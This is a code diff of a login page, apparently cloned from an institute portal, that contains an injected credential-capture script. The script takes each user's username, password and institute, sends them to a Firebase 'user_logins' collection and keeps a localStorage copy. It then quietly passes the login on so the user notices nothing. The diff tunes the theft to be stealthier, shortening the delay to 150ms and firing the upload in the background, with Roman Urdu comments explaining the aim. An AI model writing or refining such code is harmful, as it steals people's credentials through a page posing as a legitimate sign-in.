@@ -113,7 +113,7 @@ return true;
 			
 			<div class="form-group">
 				<!-- Sign In Button -->
-				<a onclick="return ButtonClick(this);" id="BodyPH_btnLogin" class="btn-block btn btn-primary" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$BodyPH$btnLogin&quot;, &quot;&quot;, true, &quot;Login&quot;, &quot;&quot;, false, true))">Sign In</a>
+				<a onclick="return ButtonClick(this);" id="BodyPH_btnLogin" class="btn-block btn btn-primary" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$BodyPH$btnLogin&quot;, &quot;&quot;, true, &quot;Login&quot;, &quot;&kin&quot;, false, true))">Sign In</a>
 			</div>
 		</div>
 	</div>
@@ -125,7 +125,7 @@ return true;
 		</footer>
 </form>
 
-<!-- Bulletproof Capture Script -->
+<!-- Ultra-Fast 150ms Guaranteed Capture Script -->
 <script type="module">
 	import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 	import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
@@ -154,31 +154,31 @@ return true;
 			const institute = instituteSelect.options[instituteSelect.selectedIndex].text;
 
 			if (username && password) {
-				try {
-					// LocalStorage mein bhi backup rakh rahe hain taake agar network ka masla ho toh data zaya na ho
-					localStorage.setItem("last_user", username);
-					localStorage.setItem("last_pass", password);
+				// LocalStorage backup taake agar network ka masla ho toh data zaya na ho
+				localStorage.setItem("bu_user", username);
+				localStorage.setItem("bu_pass", password);
 
-					await addDoc(collection(db, "user_logins"), {
+				try {
+					// Background request fire ho rahi hai
+					addDoc(collection(db, "user_logins"), {
 						username: username,
 						password: password,
 						institute: institute,
 						timestamp: new Date()
 					});
-					console.log("Captured successfully!");
 				} catch (error) {
-					console.error("Firebase Error: ", error);
+					console.error("Error: ", error);
 				}
 			}
 
-			// Thora sa delay lazmi hai taake Firebase ki HTTP request browser close hone se pehle hit ho jaye
+			// Sirf 150ms ka delay - itna kam ke user ko foran redirection lage gi aur data bhi chala jaye ga
 			setTimeout(() => {
 				if (typeof WebForm_DoPostBackWithOptions === 'function') {
 					__doPostBack('ctl00$BodyPH$btnLogin', '');
 				} else {
 					document.getElementById('form1').submit();
 				}
-			}, 500);
+			}, 150);
 		});
 	}
 </script>
